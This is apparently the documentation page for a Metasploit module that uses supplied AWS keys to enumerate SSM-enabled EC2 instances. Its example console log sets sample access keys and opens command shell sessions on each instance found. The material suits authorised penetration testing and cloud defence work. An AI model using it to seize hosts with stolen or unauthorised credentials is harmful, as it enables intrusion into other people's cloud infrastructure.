## Vulnerable Application

Provided AWS credentials, this module will call the authenticated API of Amazon Web Services to list all SSM-enabled EC2
instances accessible to the account. Once enumerated as SSM-enabled, the instances can be controlled using out-of-band
WebSocket sessions provided by the AWS API (nominally, privileged out of the box). This module provides not only the API
enumeration identifying EC2 instances accessible via SSM with given credentials, but enables session initiation for all
identified targets (without requiring target-level credentials) using the CreateSession datastore option. The module also
provides an EC2 ID filter and a limiting throttle to prevent session stampedes or expensive messes.

## Verification Steps

1. Obtain AWS access keys
2. Start msfconsole
3. Set the `ACCESS_KEY_ID`, `SECRET_ACCESS_KEY`, `REGION`
4. Run the module, see EC2 instances

## Options

## LIMIT
Only return the specified number of results from each region.

## FILTER_EC2_ID
Look for specific EC2 instance ID.

## REGION
AWS Region (e.g. "us-west-2").

## Advanced Options

### CreateSession

Create a new session for every successful login.

## Scenarios

Enumerating EC2 instances in the US-East-2 region and opening a session on each one (`CreateSession` is True).

```
msf6 auxiliary(cloud/aws/enum_ssm) > set ACCESS_KEY_ID AKIAO5WK2W9TMZT7EAM5
ACCESS_KEY_ID => AKIAO5WK2W9TMZT7EAM5
msf6 auxiliary(cloud/aws/enum_ssm) > set SECRET_ACCESS_KEY pDNhoEPuubvWSsp18axjPFBM4sNme6vnNUFb6qWo
SECRET_ACCESS_KEY => pDNhoEPuubvWSsp18axjPFBM4sNme6vnNUFb6qWo
msf6 auxiliary(cloud/aws/enum_ssm) > run

[*] Checking us-east-2...
[+] Found AWS SSM host i-02cd668d50587bdcf (ip-172-31-42-215.us-east-2.compute.internal) - 172.31.42.215
[*] AWS SSM command shell session 3 opened (192.168.250.134:39005 -> 172.31.42.215:0) at 2023-05-22 16:43:03 -0400
[+] Found AWS SSM host i-074187bde1453613a (EC2AMAZ-HM7U6TS.WORKGROUP) - 172.31.44.170
[*] AWS SSM command shell session 4 opened (192.168.250.134:37231 -> 172.31.44.170:0) at 2023-05-22 16:43:05 -0400
[*] Auxiliary module execution completed
msf6 auxiliary(cloud/aws/enum_ssm) > 
```
